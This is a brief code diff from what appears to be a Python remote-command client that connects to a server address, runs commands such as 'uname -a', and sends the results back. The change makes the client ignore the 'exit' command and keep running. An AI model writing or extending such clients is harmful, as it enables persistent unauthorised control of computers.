@@ -31,7 +31,7 @@ def connection(serv_ip, serv_port):
 
 		# Closing the connection
 		if (command[0] == 'exit'):
-			break
+			continue
 		elif (command[0] == 'sys-info'):
 			command_results = subprocess.run(['uname','-a'], capture_output=True)
 			command_results = command_results.stdout
